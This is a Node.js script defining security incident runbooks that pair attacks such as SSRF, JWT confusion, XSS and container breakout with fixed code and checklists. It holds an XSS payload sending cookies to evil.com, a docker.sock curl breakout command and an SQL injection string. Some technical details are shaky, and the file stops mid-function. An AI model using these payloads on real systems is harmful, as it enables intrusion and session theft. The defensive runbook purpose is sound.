// scripts/generate_security_production.cjs
const fs = require('fs');
const path = require('path');

const runbooks = [
  {
    id: "sec-prod-01",
    topic: "Leaked AWS IAM Root Credentials & Privilege Escalation Breach",
    category: "Cloud Security & Identity",
    severity: "P0 - Critical Breach",
    theProblem: "A developer accidentally pushed an unencrypted .env file containing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY to a public GitHub repository. Within 4 minutes, automated adversary scrapers detected the keys, created 20 new high-privilege IAM users, spun up 500 GPU spot instances across 8 global regions for cryptocurrency mining, and attempted to dump private customer S3 buckets.",
    howItWorksInternally: "Automated adversary bots poll the public GitHub Events API stream continuously in real time. When AWS credentials with unrestricted policies (e.g. AdministratorAccess or lack of permission boundaries) are detected, scripts execute automated API calls: 1) \`iam:CreateUser\` and \`iam:AttachUserPolicy\` to establish persistence; 2) \`ec2:RunInstances\` across all available AWS regions to maximize GPU compute before detection; 3) \`s3:ListBuckets\` and \`s3:GetObject\` to exfiltrate database backups. Because no MFA or IP restrictions exist on programmatic access keys, the compromise is instantaneous.",
    productionCode: `// scripts/emergencyIamRevocation.ts - Automated Incident Remediation
import { IAMClient, UpdateAccessKeyCommand, DeleteAccessKeyCommand, ListAccessKeysCommand, DetachUserPolicyCommand, ListAttachedUserPoliciesCommand } from '@aws-sdk/client-iam';

const iam = new IAMClient({ region: 'us-east-1' });

export async function emergencyRevokeCompromisedKey(userName: string, compromisedKeyId: string) {
  console.warn(\`[SEV-0] Executing Emergency Key Revocation for \${userName} (\${compromisedKeyId})...\`);

  // 1. Immediately DEACTIVATE the compromised access key (takes effect across AWS within seconds!)
  await iam.send(new UpdateAccessKeyCommand({
    UserName: userName,
    AccessKeyId: compromisedKeyId,
    Status: 'Inactive'
  }));
  console.log('[1/3] Access key status changed to INACTIVE.');

  // 2. Strip all attached administrative policies from the user
  const attached = await iam.send(new ListAttachedUserPoliciesCommand({ UserName: userName }));
  if (attached.AttachedPolicies) {
    for (const policy of attached.AttachedPolicies) {
      if (policy.PolicyArn) {
        await iam.send(new DetachUserPolicyCommand({
          UserName: userName,
          PolicyArn: policy.PolicyArn
        }));
        console.log(\`[2/3] Detached policy: \${policy.PolicyName}\`);
      }
    }
  }

  // 3. Delete the compromised access key permanently
  await iam.send(new DeleteAccessKeyCommand({
    UserName: userName,
    AccessKeyId: compromisedKeyId
  }));
  console.log('[3/3] Key permanently deleted from IAM.');
}`,
    monitoringMetrics: [
      "sum(rate(aws_cloudtrail_unauthorized_api_calls_total[1m]))",
      "aws_ec2_spot_instance_request_surge_count > 10",
      "count(aws_guardduty_findings{type=~'.*Compromised.*|.*UnauthorizedAccess.*'})"
    ],
    productionChecklist: [
      "Deactivate the leaked AWS Access Key immediately using AWS CLI: 'aws iam update-access-key --status Inactive'.",
      "Terminate all rogue EC2 instances across all global regions using AWS EC2 Global View.",
      "Check AWS CloudTrail logs for all API actions performed by the compromised Access Key ID within the past 24 hours.",
      "Enable AWS IAM Permission Boundaries across all developer roles and mandate AWS Secrets Manager for credential management."
    ]
  },
  {
    id: "sec-prod-02",
    topic: "BOLA / IDOR Bulk Data Exfiltration via Unprotected Multi-Tenant API Routes",
    category: "API & Data Layer Security",
    severity: "P0 - Critical Breach",
    theProblem: "A healthcare SaaS provider discovered an attacker exfiltrated 450,000 patient diagnostic records. The attacker created a standard free tier account, authenticated to receive a valid JWT, and iterated an automated Python script from /api/v1/patients/1 to /api/v1/patients/450000. The backend retrieved records purely by primary key ID without verifying patient organization ownership.",
    howItWorksInternally: "Broken Object Level Authorization (BOLA) occurs when an API endpoint relies on client-provided IDs (e.g. \`req.params.id\`) to select database records without joining or asserting the requesting user's verified tenant/organization identity. In this breach: 1) The authentication middleware verified the JWT was valid (satisfying authentication); 2) The controller executed \`SELECT * FROM patients WHERE id = $1\`; 3) Because no \`AND tenant_id = $2\` clause existed and no database Row-Level Security was enabled, the database happily returned patients belonging to competitor hospitals.",
    productionCode: `// repository/patientRepository.ts - Production Fixed Implementation
import { Pool } from 'pg';

const pool = new Pool();

export async function getPatientRecordSafely(patientId: string, authenticatedTenantId: string) {
  // CRITICAL FIX: Query MUST be scoped to verified tenant session context!
  const result = await pool.query(
    \`SELECT id, full_name, diagnosis, created_at
     FROM patients
     WHERE id = $1
       AND tenant_id = $2\`,
    [patientId, authenticatedTenantId]
  );

  // Return 404 rather than 403 to prevent object existence enumeration!
  if (result.rows.length === 0) {
    const error = new Error('Record not found');
    (error as any).status = 404;
    throw error;
  }

  return result.rows[0];
}`,
    monitoringMetrics: [
      "sum(rate(http_requests_total{route='/api/v1/patients/:id',status='200'}[1m])) > 100",
      "count(distinct(http_request_param_id)) by (client_ip) > 500",
      "ratio(http_404_responses / http_200_responses) on_authenticated_routes"
    ],
    productionChecklist: [
      "Audit all database query methods across controllers and repositories to ensure 'tenant_id' is mandatory in all WHERE clauses.",
      "Enable PostgreSQL Row-Level Security (RLS) on all multi-tenant tables as an architectural defense-in-depth barrier.",
      "Deploy rate limits on sequential resource endpoints (e.g. max 60 requests/minute per authenticated user).",
      "Replace sequential auto-incrementing integer IDs with unguessable UUIDv4 or NanoIDs."
    ]
  },
  {
    id: "sec-prod-03",
    topic: "SSRF Compromise Exposing Cloud Instance Metadata & Kubernetes Service Account Tokens",
    category: "Cloud & Network Security",
    severity: "P0 - Critical Breach",
    theProblem: "An attacker exploited an image preview webhook feature in a document sharing portal. By submitting http://169.254.169.254/latest/meta-data/iam/security-credentials/EKS-Worker-Node, the attacker stole temporary IAM credentials of the underlying Kubernetes node. The attacker then used the node credentials to drain production pods and access private S3 customer archives.",
    howItWorksInternally: "The image preview worker accepted user-supplied URLs and fetched them using a standard Node.js fetch() library. Because the application was running in AWS EC2 without IMDSv2 enforced, the metadata service accepted simple HTTP GET requests from link-local IP 169.254.169.254. Furthermore, the worker container shared the host network namespace (hostNetwork: true), allowing the container to bypass container-level iptables filters and speak directly to the hypervisor metadata service.",
    productionCode: `// lib/security/safeUrlFetcher.ts - Production SSRF Guard with Socket Pinning
import http from 'http';
import https from 'https';
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

export async function safeFetchUrl(untrustedUrl: string): Promise<string> {
  const parsed = new URL(untrustedUrl);

  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Invalid URL protocol');
  }

  // 1. Resolve DNS to physical IP
  const addresses = await dns.resolve4(parsed.hostname);
  if (addresses.length === 0) throw new Error('Unresolvable host');

  const targetIp = addresses[0];
  const addr = ipaddr.parse(targetIp);

  // 2. Reject private, loopback, and link-local ranges
  if (['private', 'loopback', 'linkLocal', 'multicast'].includes(addr.range())) {
    throw new Error(\`SSRF Blocked: Destination IP \${targetIp} is non-routable private address!\`);
  }

  // 3. Fetch with redirects disabled to prevent 302 redirect hopping!
  const response = await fetch(parsed.toString(), {
    redirect: 'manual', // DO NOT FOLLOW REDIRECTS AUTOMATICALLY!
    signal: AbortSignal.timeout(3000)
  });

  if (response.status >= 300 && response.status < 400) {
    throw new Error('Redirects are forbidden on untrusted URLs');
  }

  return await response.text();
}`,
    monitoringMetrics: [
      "sum(rate(aws_ec2_imds_v1_requests_total[1m]))",
      "count(outbound_http_requests{destination_ip='169.254.169.254'})",
      "waf_ssrf_blocked_requests_total"
    ],
    productionChecklist: [
      "Enforce AWS IMDSv2 globally: 'aws ec2 modify-instance-metadata-options --http-tokens required --http-put-response-hop-limit 1'.",
      "Disable automatic redirect following in all backend HTTP clients handling user-supplied URLs.",
      "Verify no application containers run with 'hostNetwork: true' in Kubernetes cluster.",
      "Implement egress network firewalls blocking pod access to link-local 169.254.169.254 except for designated infrastructure pods."
    ]
  },
  {
    id: "sec-prod-04",
    topic: "Timing Attack on Webhook Signature / API Key Verification Permitting Forgery",
    category: "Applied Cryptography",
    severity: "P1 - High Severity",
    theProblem: "A fintech payment processor experienced fraudulent order approvals. Attackers forged webhook signatures from a payment gateway. Forensic analysis revealed the application verified HMAC signatures using standard JavaScript string comparison (signature === expectedSignature), allowing attackers to reconstruct valid 64-character hex signatures byte-by-byte via statistical network latency measurements.",
    howItWorksInternally: "Standard string equality comparison in V8 (and most programming languages) short-circuits on the first mismatched byte: if index 0 is wrong, it returns false in ~10 nanoseconds; if index 0 matches but index 1 is wrong, it returns in ~25 nanoseconds. Over thousands of automated measurements across a low-jitter network connection, attackers measure statistical response distributions. Once byte 0 is confirmed, they brute force byte 1, reducing the keyspace of a 256-bit hash from 2^256 down to 16 * 64 = 1,024 HTTP requests.",
    productionCode: `// lib/security/constantTimeVerification.ts - Production Fixed Implementation
import crypto from 'crypto';

export function verifyWebhookSignatureConstantTime(
  rawBody: Buffer,
  signatureHeaderHex: string,
  secretKey: string
): boolean {
  // 1. Compute expected HMAC-SHA256
  const hmac = crypto.createHmac('sha256', secretKey);
  hmac.update(rawBody);
  const expectedHmac = hmac.digest(); // 32-byte Buffer

  const suppliedHmac = Buffer.from(signatureHeaderHex, 'hex');

  // 2. Length check: If lengths differ, compare dummy buffer to preserve execution time!
  if (expectedHmac.length !== suppliedHmac.length) {
    crypto.timingSafeEqual(expectedHmac, expectedHmac);
    return false;
  }

  // 3. Constant-time byte evaluation: Takes identical nanoseconds regardless of match location!
  return crypto.timingSafeEqual(expectedHmac, suppliedHmac);
}`,
    monitoringMetrics: [
      "histogram_quantile(0.99, rate(webhook_verification_duration_seconds_bucket[1m]))",
      "sum(rate(webhook_signature_failures_total[1m])) by (client_ip) > 50",
      "ratio(invalid_webhook_attempts / valid_webhook_attempts)"
    ],
    productionChecklist: [
      "Search codebase for '=== expectedHmac' or '=== apiKey' and replace with crypto.timingSafeEqual().",
      "Ensure length differences trigger dummy constant-time operations to prevent length leakage.",
      "Deploy rate limiting on webhook verification endpoints to limit failed attempts per IP.",
      "Add randomized 5-10ms artificial jitter delay to webhook error responses."
    ]
  },
  {
    id: "sec-prod-05",
    topic: "JWT Algorithm Confusion (RS256 to HS256) Key Switching Exploit",
    category: "Authentication & Identity",
    severity: "P0 - Critical Breach",
    theProblem: "An attacker gained super-administrator access across an enterprise platform without knowing the private key. The auth service issued RS256 tokens using a public/private RSA key pair. The attacker changed the JWT header alg to HS256, signed the token using the server's public RSA key (downloaded from /.well-known/jwks.json) as the symmetric secret, and the API server accepted the forged admin token as 100% valid.",
    howItWorksInternally: "In asymmetric RS256, tokens are verified using a public key. In symmetric HS256, tokens are verified using a shared secret. When a verification library naively trusts the incoming token's header: \`jwt.verify(token, key)\` without restricting allowed algorithms, the library checks \`header.alg\`. If the attacker changes \`alg\` to \`HS256\`, the library invokes HMAC-SHA256 using the \`key\` parameter as the symmetric secret. Because the public key PEM is public knowledge, the attacker computes \`HMAC_SHA256(publicKeyPem, forgedPayload)\`. When the server verifies, the signature matches perfectly.",
    productionCode: `// lib/auth/jwtVerifier.ts - Production Hardened JWT Verification
import jwt from 'jsonwebtoken';

const TRUSTED_ISSUER = 'https://auth.enterprise.com';
const TRUSTED_AUDIENCE = 'https://api.enterprise.com';

export function verifyAccessTokenHardened(token: string, publicKeyPem: string) {
  // CRITICAL FIX: Explicitly restrict allowed algorithms to RS256!
  // Rejects HS256, 'none', and all other algorithm switching tricks immediately!
  return jwt.verify(token, publicKeyPem, {
    algorithms: ['RS256'], // HARD WHITELIST!
    issuer: TRUSTED_ISSUER,
    audience: TRUSTED_AUDIENCE,
    clockTolerance: 10, // 10s leeway for NTP clock skew
    ignoreExpiration: false
  });
}`,
    monitoringMetrics: [
      "count(jwt_verification_errors_total{reason='invalid_algorithm'})",
      "sum(rate(http_requests_total{status='401',error='jwt_malformed'}[1m]))",
      "admin_token_issuances_vs_admin_logins_ratio"
    ],
    productionChecklist: [
      "Audit all jwt.verify() calls to guarantee 'algorithms: [\"RS256\"]' is explicitly passed.",
      "Never allow the incoming JWT header 'alg' to dynamically dictate the verification algorithm.",
      "Ensure the 'none' algorithm is rejected by all verification libraries in CI automated tests.",
      "Rotate RSA key pairs and deploy new JWKS key IDs (kid) if algorithm confusion is suspected."
    ]
  },
  {
    id: "sec-prod-06",
    topic: "Layer 7 HTTP/2 Rapid Reset & Volumetric Application-Layer DoS",
    category: "Network & Infrastructure Hardening",
    severity: "P0 - Critical Outage",
    theProblem: "During peak business hours, web servers crashed with 100% CPU utilization and out-of-memory errors. The servers were hit by the HTTP/2 Rapid Reset zero-day (CVE-2023-44487), processing over 200,000 reset requests per second per connection, overwhelming reverse proxies and dropping 99% of legitimate customer traffic.",
    howItWorksInternally: "HTTP/2 introduces stream multiplexing over a single TCP connection. The Rapid Reset attack abuses the \`RST_STREAM\` control frame: the client sends an \`HEADERS\` frame to initiate a request stream, and immediately follows it with a \`RST_STREAM\` frame to cancel it. The client repeats this thousands of times without waiting for server responses. While the server cancels the response stream, the request processing overhead and state table allocations spike CPU to 100% before the proxy can garbage collect the context.",
    productionCode: `# nginx.conf - Production Hardened HTTP/2 Rapid Reset Mitigation

# 1. Restrict concurrent streams per HTTP/2 connection
http2_max_concurrent_streams 64;

# 2. Limit maximum requests processed per single keep-alive connection
keepalive_requests 1000;

# 3. Limit rapid stream resets to prevent CVE-2023-44487 exploitation
# Closes the TCP connection if client sends excessive stream resets
limit_req_zone $binary_remote_addr zone=http2_rst_limit:10m rate=100r/s;

server {
    listen 443 ssl http2;
    server_name api.enterprise.com;

    limit_req zone=http2_rst_limit burst=200 nodelay;
    limit_req_status 429;

    # Timeouts to drop abusive connections quickly
    client_body_timeout 10s;
    client_header_timeout 10s;
}`,
    monitoringMetrics: [
      "sum(rate(nginx_http2_rst_stream_total[1m])) by (instance)",
      "histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[1m]))",
      "node_cpu_seconds_total{mode='system'} / node_cpu_count"
    ],
    productionChecklist: [
      "Upgrade Nginx to >= 1.25.3 or Envoy to >= 1.28.0 with upstream Rapid Reset patches.",
      "Configure http2_max_concurrent_streams to 64 or 128 (down from default 1024).",
      "Deploy Cloudflare or AWS WAF Layer 7 DDoS mitigation rules to absorb rapid stream floods at the edge.",
      "Monitor http2 reset stream counters in Prometheus for anomalous spikes."
    ]
  },
  {
    id: "sec-prod-07",
    topic: "Software Supply Chain Compromise via Malicious Upstream npm Package",
    category: "DevSecOps & Supply Chain Security",
    severity: "P0 - Critical Breach",
    theProblem: "A minor utility package used for formatting currency dates had its maintainer account hijacked on npm. The attacker published a patch release (v1.2.4) containing an obfuscated postinstall script. During automated CI/CD builds, the script executed, dumped all environment variables (including production DATABASE_URL and STRIPE_SECRET_KEY), and uploaded them to an external Command & Control server.",
    howItWorksInternally: "When \`npm install\` executes, npm runs package lifecycle scripts (\`preinstall\`, \`install\`, \`postinstall\`) as arbitrary shell commands on the host machine. If an application uses flexible semver pins (e.g. \`^1.2.0\`), automated builds fetch the newer compromised patch release (\`1.2.4\`) automatically. The postinstall script reads \`process.env\`, base64 encodes the secrets, and issues an asynchronous HTTP POST or DNS tunneling query to exfiltrate the keys before the build even compiles.",
    productionCode: `// 1. Enforce strict npm lockfile execution and disable scripts in CI
// package.json snippet:
/*
{
  "scripts": {
    "ci:secure": "npm ci --ignore-scripts && npm rebuild --ignore-scripts"
  }
}
*/

// 2. .npmrc Configuration: Disable arbitrary postinstall execution globally
// .npmrc:
// ignore-scripts=true

// 3. Socket.dev / Snyk Automated PR Guard in GitHub Actions
// .github/workflows/dependency-review.yml
/*
name: Dependency Review
on: [pull_request]
jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          allow-licenses: MIT, Apache-2.0, BSD-3-Clause
*/`,
    monitoringMetrics: [
      "count(github_dependabot_security_alerts{severity='CRITICAL'})",
      "rate(ci_runner_outbound_network_connections_total[1m])",
      "waf_blocked_egress_requests_from_build_subnets"
    ],
    productionChecklist: [
      "Immediately rotate all secrets exposed in CI/CD environments (Stripe, AWS, database credentials).",
      "Add 'ignore-scripts=true' to .npmrc to prevent dependencies running arbitrary install-time shell scripts.",
      "Pin all dependencies strictly to exact versions without caret (^) or tilde (~) in package.json.",
      "Integrate automated software supply chain scanners (Socket.dev / Snyk) to block malicious packages at PR stage."
    ]
  },
  {
    id: "sec-prod-08",
    topic: "Second-Order SQL Injection via Dynamic Stored Procedure Execution",
    category: "Data Layer Security",
    severity: "P1 - High Severity",
    theProblem: "An attacker registered an account with a malicious username: admin' OR '1'='1. The registration endpoint used parameterized queries, so the account was saved safely. However, an hourly administrative stored procedure compiled a dynamic SQL audit report using EXECUTE 'SELECT * FROM users WHERE name = ''' || user_rec.name || ''''. The procedure executed the injected string, dumping all enterprise payroll tables to an audit log table visible in the UI.",
    howItWorksInternally: "In Second-Order SQL Injection, the initial payload is not executed immediately; it is stored safely in the database. The vulnerability occurs when a secondary internal system (nightly cron job, stored procedure, administrative export) reads the stored string from the database and naively concatenates it into a new dynamic SQL query. Because developers assume data already inside their database is 'trusted', they omit prepared statements in secondary queries, allowing the payload to trigger.",
    productionCode: `-- VULNERABLE STORED PROCEDURE:
-- EXECUTE 'SELECT * FROM users WHERE name = ''' || user_record.name || ''''; -- EXPLOITABLE!

-- PRODUCTION FIXED POSTGRESQL STORED PROCEDURE:
CREATE OR REPLACE FUNCTION generate_audit_report(target_username TEXT)
RETURNS TABLE(user_id INT, email TEXT, status TEXT) AS $$
BEGIN
  -- FIX: Use strict parameterized EXECUTE ... USING syntax!
  -- Input is bound as parameter register $1, never concatenated!
  RETURN QUERY EXECUTE
    'SELECT id, email, status FROM users WHERE name = $1'
    USING target_username;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;`,
    monitoringMetrics: [
      "sum(rate(postgresql_query_syntax_errors_total[1m]))",
      "count(pg_stat_activity{state='active',query=~'.*OR 1=1.*'})",
      "siem_sql_injection_detection_alerts_total"
    ],
    productionChecklist: [
      "Audit all database stored procedures and functions for dynamic 'EXECUTE' concatenation.",
      "Use 'EXECUTE ... USING' in PL/pgSQL to enforce parameterization inside database stored routines.",
      "Never treat data stored in your own database as implicitly safe; re-parameterize when re-querying.",
      "Enforce least-privilege execution roles (avoid unnecessary SECURITY DEFINER privileges on functions)."
    ]
  },
  {
    id: "sec-prod-09",
    topic: "Stored XSS & Session Hijacking via Markdown Renderer Bypass",
    category: "Web Application Defense",
    severity: "P1 - High Severity",
    theProblem: "A collaborative project management portal allowed users to write comments in Markdown. An attacker posted a comment containing an obfuscated SVG image payload: <svg><a xlink:href=\"javascript:fetch('https://evil.com/leak?c='+document.cookie)\"><circle r=100 /></a></svg>. When other team members viewed the task, clicking the image exfiltrated their session cookies, allowing the attacker to hijack team lead accounts.",
    howItWorksInternally: "Many Markdown libraries (marked, markdown-it) compile Markdown into raw HTML. By default, these libraries allow raw inline HTML tags (<svg>, <iframe>, <script>) to pass through unescaped. Furthermore, attackers utilize SVG animation tags (<animate>), object tags, and data: URIs that bypass simplistic string blacklists. Because the session cookie lacked the HttpOnly flag, client-side JavaScript accessed document.cookie and exfiltrated the session identifier via an image fetch.",
    productionCode: `// components/SafeMarkdown.tsx - Production Hardened Markdown Renderer
import React from 'react';
import { marked } from 'marked';
import DOMPurify from 'isomorphic-dompurify';

interface SafeMarkdownProps {
  content: string;
}

export function SafeMarkdown({ content }: SafeMarkdownProps) {
  // 1. Compile Markdown to HTML
  const rawHtml = marked.parse(content, { async: false }) as string;

  // 2. Hardened DOMPurify Sanitization: Strip dangerous tags and JS protocols
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      'p', 'b', 'i', 'strong', 'em', 'h1', 'h2', 'h3',
      'ul', 'ol', 'li', 'code', 'pre', 'blockquote', 'a'
    ],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
    // Block SVG / MathML clobbering and XSS vectors
    USE_PROFILES: { html: true, svg: false, mathMl: false }
  });

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}`,
    monitoringMetrics: [
      "count(csp_violation_reports_total{directive='script-src'})",
      "sum(rate(client_errors_total{type='xss_vector_detected'}[1m]))",
      "ratio(session_resets_after_cookie_leaks)"
    ],
    productionChecklist: [
      "Always set 'httpOnly: true' on all session cookies to prevent JavaScript read access via document.cookie.",
      "Pass all Markdown compiler outputs through DOMPurify with strict HTML profiles before rendering.",
      "Disable raw HTML in markdown parser configurations: 'marked.use({ sanitize: false })' paired with DOMPurify.",
      "Deploy Content Security Policy (CSP) with 'script-src strict-dynamic' to block unauthorized inline scripts."
    ]
  },
  {
    id: "sec-prod-10",
    topic: "Distributed Botnet Credential Stuffing & Account Takeover (ATO) Storm",
    category: "Authentication & Identity",
    severity: "P0 - Critical Outage",
    theProblem: "A consumer fintech portal experienced 3.5 million login attempts in 2 hours coming from 45,000 unique residential IP addresses. Attackers were using credentials leaked from other third-party breaches to take over accounts. Standard IP-based rate limiting failed completely because each individual IP only sent 1 request every 4 minutes.",
    howItWorksInternally: "Credential stuffing leverages automated tools (OpenBullet, SilverBullet) powered by proxy networks (BrightData, Oxylabs) that rotate through thousands of residential IPs. Because per-IP rate limiting allows 5-10 requests per IP, residential botnets fly under the radar. The attackers achieve 0.5% - 2% takeover rates because users frequently reuse identical email/password combinations across multiple platforms.",
    productionCode: `// middleware/credentialStuffingDefense.ts - Production Multi-Layered ATO Defense
import { Request, Response, NextFunction } from 'express';
import { Redis } from 'ioredis';
import crypto from 'crypto';

const redis = new Redis();

export async function atoGuardMiddleware(req: Request, res: Response, next: NextFunction) {
  const { email, password } = req.body;
  if (!email) return next();

  const emailHash = crypto.createHash('sha256').update(email.toLowerCase()).digest('hex');

  // 1. GLOBAL USERNAME RATE LIMIT: Max 5 failed attempts per account across ALL IPs!
  const accountFailedKey = \`failed_logins:user:\${emailHash}\`;
  const failedCount = await redis.get(accountFailedKey);

  if (failedCount && parseInt(failedCount, 10) >= 5) {
    // Force Step-Up Challenge (Cloudflare Turnstile CAPTCHA or Email Magic Link)
    return res.status(429).json({
      error: 'ACCOUNT_LOCKED',
      message: 'Account temporarily locked due to excessive failed attempts. Check email to unlock.'
    });
  }

  // 2. GLOBAL SYSTEM VELOCITY BREAKER: If global failed logins spike 10x normal, trigger Captcha platform-wide
  const globalVelocity = await redis.incr('global_login_velocity_1m');
  if (globalVelocity === 1) await redis.expire('global_login_velocity_1m', 60);

  if (globalVelocity > 5000) {
    const turnstileToken = req.headers['cf-turnstile-response'];
    if (!turnstileToken) {
      return res.status(403).json({ error: 'CAPTCHA_REQUIRED', message: 'High traffic detected. Complete CAPTCHA.' });
    }
  }

  next();
}`,
    monitoringMetrics: [
      "sum(rate(http_requests_total{route='/login',status='401'}[1m])) > 100",
      "ratio(successful_logins / total_login_attempts) < 0.10",
      "count(distinct(client_ip)) on_route '/login' > 1000"
    ],
    productionChecklist: [
      "Rate limit logins based on targeted account username/email hash, NOT purely by client IP.",
      "Deploy Cloudflare Turnstile or reCAPTCHA v3 invisible challenges on high-velocity login spikes.",
      "Check new passwords against HaveIBeenPwned API during registration to eliminate compromised credentials.",
      "Mandate Multi-Factor Authentication (FIDO2 Passkeys / TOTP) across all user accounts."
    ]
  },
  {
    id: "sec-prod-11",
    topic: "Padding Oracle Attack on Legacy Symmetric AES-CBC Cookie Session Store",
    category: "Applied Cryptography",
    severity: "P0 - Critical Breach",
    theProblem: "An older microservice stored session data in encrypted cookies using AES-CBC with PKCS#7 padding. An attacker sent thousands of modified cookie payloads, monitoring whether the server returned HTTP 200 (valid padding) or HTTP 500 (padding error). In under 20 minutes, the attacker decrypted session tokens and forged a forged super-admin session cookie.",
    howItWorksInternally: "AES-CBC is an unauthenticated cipher. PKCS#7 padding appends $N$ bytes of value $N$ to fill the final 16-byte block. When a server decrypts ciphertext and throws a distinct error on padding failures vs MAC failures, it acts as a Padding Oracle. By manipulating the ciphertext byte $C_{i-1}$ and sending it to the server, an attacker systematically deduces the intermediate plaintext byte $P_i$ through bitwise XOR, decrypting any block in at most 256 requests per byte without knowing the secret key.",
    productionCode: `// MIGRATION FIX: Replace AES-CBC with Authenticated AES-GCM Encryption!
import crypto from 'crypto';

export function createSecureSessionCookie(sessionData: object, key32Bytes: Buffer): string {
  // CRITICAL FIX: Use AES-256-GCM (AEAD) which eliminates padding entirely!
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key32Bytes, iv);

  const plaintext = JSON.stringify(sessionData);
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag(); // 16-byte cryptographic integrity tag

  // Bundle into safe base64url string: [IV(12) || TAG(16) || CIPHERTEXT]
  return Buffer.concat([iv, tag, ciphertext]).toString('base64url');
}

export function readSecureSessionCookie(cookieValue: string, key32Bytes: Buffer): object {
  const raw = Buffer.from(cookieValue, 'base64url');
  const iv = raw.subarray(0, 12);
  const tag = raw.subarray(12, 28);
  const ciphertext = raw.subarray(28);

  const decipher = crypto.createDecipheriv('aes-256-gcm', key32Bytes, iv);
  decipher.setAuthTag(tag);

  // Throws generic auth error if ANY byte is tampered with!
  const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return JSON.parse(decrypted.toString('utf8'));
}`,
    monitoringMetrics: [
      "count(crypto_padding_oracle_exceptions_total)",
      "sum(rate(http_requests_total{status='500',error=~'.*padding.*'}[1m]))",
      "ratio(malformed_session_cookies / total_sessions)"
    ],
    productionChecklist: [
      "Deprecate AES-CBC, AES-CTR (without HMAC), and 3DES across all session and payload encryption systems.",
      "Migrate immediately to AES-256-GCM or ChaCha20-Poly1305 (AEAD ciphers that prevent padding oracles).",
      "Return uniform generic error responses for all cryptographic and session failures to prevent side-channel information leakage.",
      "Rotate all historical session encryption master keys."
    ]
  },
  {
    id: "sec-prod-12",
    topic: "Container Breakout to Host Node via Insecure Docker Socket Mount",
    category: "Container & Cloud Security",
    severity: "P0 - Critical Breach",
    theProblem: "A CI/CD runner container running inside a Kubernetes cluster was compromised via an RCE in a test script. The container had /var/run/docker.sock mounted from the host node to allow running Docker-in-Docker builds. The attacker queried the socket, spawned an unconstrained container with host root mounted at /host, chrooted into the host, and stole the kubelet credentials, compromising the entire Kubernetes cluster.",
    howItWorksInternally: "The Docker daemon socket (/var/run/docker.sock) is a UNIX domain socket that provides full administrative control over the Docker engine. Anyone who can write to this socket possesses root privileges over the host OS. The exploit is trivial: \`curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/hostroot\"]}'\`. Starting this container allows executing commands inside the host's root filesystem, accessing all secrets, memory, and kernel processes.",
    productionCode: `# 1. Enforce Kyverno Admission Controller Policy to ban docker.sock mounts
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-docker-socket-mount
spec:
  validationFailureAction: Enforce
  rules:
  - name: block-docker-socket
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Mounting /var/run/docker.sock is strictly forbidden!"
      pattern:
        spec:
          =(volumes):
            - =(hostPath):
                path: "!/var/run/docker.sock"

# 2. Modern Replacement: Use Rootless Kaniko for in-cluster container builds!
# Kaniko builds container images in userspace inside the container WITHOUT needing docker.sock!`,
    monitoringMetrics: [
      "count(k8s_pods_with_hostpath_mounts{path='/var/run/docker.sock'})",
      "kyverno_policy_violations_total{policy='disallow-docker-socket-mount'}",
      "sum(rate(container_escape_attempts_total[1m]))"
    ],
    productionChecklist: [
      "Audit all Helm charts and manifests to remove any mounts of '/var/run/docker.sock'.",
      "Replace Docker-in-Docker with userspace rootless image builders like Kaniko, Buildah, or Chainguard.",
      "Deploy Kyverno or OPA Gatekeeper admission controllers to reject any pod attempting to mount hostPath.",
      "Isolate CI/CD runner pools onto dedicated, separate worker node groups with restricted IAM roles."
    ]
  },
  {
    id: "sec-prod-13",
    topic: "Webhook Replay Exploit Causing Double-Credit Financial Duplication",
    category: "API & Microservice Security",
    severity: "P0 - Critical Breach",
    theProblem: "A merchant payout microservice processed refund webhooks. An attacker intercepted an authentic refund webhook payload (status: 'REFUND_APPROVED', amount: $5,000) and replayed the exact HTTP POST request 200 times within 4 minutes. Because the service verified the HMAC signature (which was valid) but lacked an idempotency state machine, the merchant's bank account was credited $1,000,000.",
    howItWorksInternally: "Cryptographic HMAC signatures prove that the payload was created by the authentic sender and was not tampered with in transit. However, HMAC signatures DO NOT prove freshness or uniqueness! If a system does not track processed event IDs (e.g. \`evt_1Mqw5...\`) in an atomic transactional database or cache, every validly signed replay is treated as a new, distinct business transaction.",
    productionCode: `// services/webhookConsumer.ts - Production Atomic Idempotency State Machine
import { Pool } from 'pg';
import { Redis } from 'ioredis';

const pool = new Pool();
const redis = new Redis();

export async function processRefundWebhookSafely(eventId: string, amountCents: number, merchantId: string) {
  const lockKey = \`webhook:lock:\${eventId}\`;

  // 1. Atomic reservation lock with 60-second expiration (Distributed Mutex)
  const acquired = await redis.set(lockKey, 'processing', 'EX', 60, 'NX');
  if (!acquired) {
    throw new Error('Concurrent webhook delivery in-flight');
  }

  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    // 2. Insert event ID into database with UNIQUE constraint
    // If event was ALREADY processed, ON CONFLICT DO NOTHING prevents duplication!
    const insertRes = await client.query(
      \`INSERT INTO processed_webhook_events (event_id, processed_at)
       VALUES ($1, NOW())
       ON CONFLICT (event_id) DO NOTHING
       RETURNING event_id\`,
      [eventId]
    );

    if (insertRes.rowCount === 0) {
      console.log(\`[Idempotency] Webhook event \${eventId} was already processed. Ignoring replay.\`);
      await client.query('ROLLBACK');
      return { duplicate: true }; // Acknowledge with 200 OK without re-crediting!
    }

